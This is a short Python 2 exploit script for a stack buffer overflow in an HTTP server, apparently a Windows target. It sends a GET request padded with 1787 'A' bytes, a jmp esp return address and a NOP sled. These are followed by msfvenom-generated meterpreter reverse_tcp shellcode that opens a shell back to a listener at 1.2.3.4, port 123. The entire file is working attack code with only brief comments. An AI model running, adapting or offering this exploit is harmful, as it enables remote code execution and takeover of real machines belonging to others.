#!/usr/bin/python
import sys
import socket

#initialize socket, connect to target
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target = sys.argv[1]
port = int(sys.argv[2])
s.connect((target, port))

#define payload
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=123 -f py -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x40" -v payload --smallest
payload =  ""
payload += "\x33\xc9\x83\xe9\xac\xe8\xff\xff\xff\xff\xc0\x5e"
payload += "\x81\x76\x0e\xa1\xdb\xee\xba\x83\xee\xfc\xe2\xf4"
payload += "\x5d\x33\x6c\xba\xa1\xdb\x8e\x33\x44\xea\x2e\xde"
payload += "\x2a\x8b\xde\x31\xf3\xd7\x65\xe8\xb5\x50\x9c\x92"
payload += "\xae\x6c\xa4\x9c\x90\x24\x42\x86\xc0\xa7\xec\x96"
payload += "\x81\x1a\x21\xb7\xa0\x1c\x0c\x48\xf3\x8c\x65\xe8"
payload += "\xb1\x50\xa4\x86\x2a\x97\xff\xc2\x42\x93\xef\x6b"
payload += "\xf0\x50\xb7\x9a\xa0\x08\x65\xf3\xb9\x38\xd4\xf3"
payload += "\x2a\xef\x65\xbb\x77\xea\x11\x16\x60\x14\xe3\xbb"
payload += "\x66\xe3\x0e\xcf\x57\xd8\x93\x42\x9a\xa6\xca\xcf"
payload += "\x45\x83\x65\xe2\x85\xda\x3d\xdc\x2a\xd7\xa5\x31"
payload += "\xf9\xc7\xef\x69\x2a\xdf\x65\xbb\x71\x52\xaa\x9e"
payload += "\x85\x80\xb5\xdb\xf8\x81\xbf\x45\x41\x84\xb1\xe0"
payload += "\x2a\xc9\x05\x37\xfc\xb3\xdd\x88\xa1\xdb\x86\xcd"
payload += "\xd2\xe9\xb1\xee\xc9\x97\x99\x9c\xa6\x24\x3b\x02"
payload += "\x31\xda\xee\xba\x88\x1f\xba\xea\xc9\xf2\x6e\xd1"
payload += "\xa1\x24\x3b\xd0\xab\xb3\xe4\xb1\xa1\xf5\x86\xb8"
payload += "\xa1\xda\x55\x33\x47\x8b\xbe\xea\xf1\x9b\xbe\xfa"
payload += "\xf1\xb3\x04\xb5\x7e\x3b\x11\x6f\x36\xb1\xfe\xec"
payload += "\xf6\xb3\x77\x1f\xd5\xba\x11\x6f\x24\x1b\x9a\xb0"
payload += "\x5e\x95\xe6\xcf\x4d\x33\x8f\xba\xa1\xdb\x84\xba"
payload += "\xcb\xdf\xb8\xed\xc9\xd9\x37\x72\xfe\x24\x3b\x39"
payload += "\x59\xdb\x90\x8c\x2a\xed\x84\xfa\xc9\xdb\xfe\xba"
payload += "\xa1\x8d\x84\xba\xc9\x83\x4a\xe9\x44\x24\x3b\x29"
payload += "\xf2\xb1\xee\xec\xf2\x8c\x86\xb8\x78\x13\xb1\x45"
payload += "\x74\x58\x16\xba\xdc\xf9\xb6\xd2\xa1\x9b\xee\xba"
payload += "\xcb\xdb\xbe\xd2\xaa\xf4\xe1\x8a\x5e\x0e\xb9\xd2"
payload += "\xd4\xb5\xa3\xdb\x5e\x0e\xb0\xe4\x5e\xd7\xca\x53"
payload += "\xd0\x24\x11\x45\xa0\x18\xc7\x7c\xd4\x1c\x2d\x01"
payload += "\x51\x6e\x4c\xec\xcb\xdb\xbd\x45\x74\xdb\xee\xba"

#creating malicious request
evil = "GET "
#overflow
evil += "\x41"*1787
#jmp esp 0x7e3a9353
evil += "\x53\x93\x3a\x7e"
#nop sled
evil += "\x90"*30
#reverse shell payload
evil += payload
#end evil request
evil += " HTTP/1.1\r\n\r\n"

#send request
s.send(evil)
#close socket
s.close()
